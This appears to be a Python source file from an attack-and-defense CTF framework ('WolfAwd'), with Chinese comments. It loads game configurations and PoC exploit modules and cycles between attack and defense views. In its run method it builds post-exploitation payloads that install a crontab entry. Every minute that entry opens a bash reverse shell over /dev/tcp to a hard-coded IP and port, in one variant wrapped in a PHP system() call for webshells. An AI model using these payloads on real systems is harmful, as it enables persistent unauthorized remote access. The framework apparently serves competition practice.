import sys
from importlib import import_module
from library.utils.orm import database_init

from .utils.error import *

class WolfAwd():
    def __init__(self):
        #　数据库会话
        self.session = database_init()
        self.reverse_shell_ip = '192.168.0.102'
        self.reverse_shell_port = 7777


    def run(self, global_config):
        self.global_config = global_config
        try:
            """
            动态拼接运行模式cli ，将 通用视图导入，包含比赛初始化页面
            """
            mode = global_config["mode"]
            default_type = global_config["default_type"]
            self.common_views = import_module("library.views.common."+mode)
        except KeyError:
            raise FrameworkRuntimeException("global_config 内容缺失")
        except ModuleNotFoundError:
            raise FrameworkRuntimeException("mode default_type 配置错误，模块未找到")

        """
        导入data,包含攻击信息
        这里是poc攻击后执行的命令
        后期拼接ip执行反弹shell
        """
        self.data = {
            "getwebshell": r"""system('echo "*/1 * * * * bash -c \'bash -i >/dev/tcp/{reverse_shell_ip}/{reverse_shell_port} 0>&1\';" |crontab');""".format(
            reverse_shell_ip=self.reverse_shell_ip, reverse_shell_port=self.reverse_shell_port),
            "getosshell": r"""echo "*/1 * * * * bash -c 'bash -i >/dev/tcp/{reverse_shell_ip}/{reverse_shell_port} 0>&1';" |crontab""".format(
            reverse_shell_ip=self.reverse_shell_ip, reverse_shell_port=self.reverse_shell_port)
        }

        self.common_views.show()
        """
        蒋games文件夹加入搜索路径,导入
        game.config  是games 目录的配置信息,包含当前比赛名称
        利用当前比赛明确获取 current_game_config
        从 current_game_config 获取 type
    
        """
        sys.path.append("../games")
        import games
        self.current_game_name = games.config["now_game"]
        self.current_game = import_module("games."+games.config["now_game"])
        self.current_game_config = self.current_game.config
        #　如果用户未指定，type类型,既攻击还是防守,使用框架默认配置
        self.current_type = self.current_game_config.get('type', default_type)
        # app = WolfAwd(current_game_name)


        """
         实现视图的切换,
         攻击和防护模块show函数应该返回希望切换的模块,defense 或者 exploit
         如果返回为空,则结束框架执行
         
        """
        while self.current_type:
            self.type_views = import_module("library.views."+self.current_type+"."+mode)
            self.current_type = self.type_views.show()
        """
        结束视图
        """
        self.common_views.exit()

    @property
    def poces(self):
        """
        类属性注册poc
        后期扩展自动发现,每次获取到的最新的poc

        """
        poces = []
        for poc in self.current_game.config['poces']:
            poc = import_module("games."+self.current_game_name+".poc."+poc)
            poces.append(poc)
        return poces


"""

功能类导入app,既可使用app下面的数据

"""
app = WolfAwd()

run = app.run
